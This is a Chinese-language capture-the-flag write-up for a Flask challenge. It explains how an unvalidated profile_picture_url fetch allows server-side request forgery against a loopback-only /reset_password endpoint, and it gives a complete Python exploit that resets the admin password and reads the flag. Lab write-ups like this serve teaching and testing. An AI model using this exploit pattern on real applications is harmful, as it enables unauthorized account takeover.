# Writeup

## 1. 题目描述
目标：以管理员身份登录并获取管理员页面上的 FLAG。
应用提供注册、登录、个人资料修改以及一个受 IP 限制的 `/reset_password` 接口。

## 2. 知识点
- SSRF（服务器端请求伪造）基础：利用服务器主动访问外部或本地 URL。
- 访问控制绕过：通过内部回环地址访问仅限 127.0.0.1 的保护接口。
- Flask 简易会话与逻辑分析。

## 3. 解题方法思路
源码中个人资料更新支持通过 `profile_picture_url` 下载远程图片：
```python
urllib.request.urlretrieve(profile_picture_url, ...)
```
未校验协议/域名，可构造指向 `http://127.0.0.1/reset_password?...` 的 URL，服务端自身发起请求命中仅允许本地访问的管理接口并重置 `admin` 密码。随后使用新密码直接登录管理员账号，在 `/profile` 模板（admin 分支）显示 `FLAG`。

## 4. 解题步骤
1. 注册普通用户并登录，拿到可访问 `/profile` 的会话。  
2. 在个人资料提交表单中 `profile_picture_url` 设置为：
   `http://127.0.0.1/reset_password?username=admin&newpassword=pwned123!` 触发服务端请求并成功重置管理员密码。  
3. 注销或直接使用新密码 `pwned123!` 登录 `admin`。  
4. 访问 `/profile`，因为当前是 admin，模板会渲染 `<h3>{{ flag }}</h3>`，得到 FLAG。  

## 5. EXP (Python)
```python
import requests
import re
import random
import string

BASE = "http://ip32787"


def randstr(n=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def register_and_login(session, username, password):
    session.post(f"{BASE}/register", data={
        "username": username,
        "password": password,
        "first_name": "User",
        "last_name": "Test",
        "email": f"{username}@example.com",
    })
    session.post(f"{BASE}/login", data={"username": username, "password": password})


def ssrf_reset_admin(session, new_admin_password):
    target = f"http://127.0.0.1/reset_password?username=admin&newpassword={new_admin_password}"
    session.post(f"{BASE}/profile", data={
        "first_name": "User",
        "last_name": "Test",
        "email": "user@example.com",
        "profile_picture_url": target,
    })


def login_admin_and_get_flag(session, admin_password):
    session.post(f"{BASE}/login", data={"username": "admin", "password": admin_password})
    r = session.get(f"{BASE}/profile")
    m = re.findall(r"<h3>(.*?)</h3>", r.text, flags=re.IGNORECASE | re.DOTALL)
    return m[-1].strip()


def main():
    s = requests.Session()
    username = "u" + randstr()
    user_password = "pass123!"
    new_admin_password = "pwned123!"

    register_and_login(s, username, user_password)
    ssrf_reset_admin(s, new_admin_password)
    flag = login_admin_and_get_flag(s, new_admin_password)
    print(flag)

if __name__ == "__main__":
    main()
```

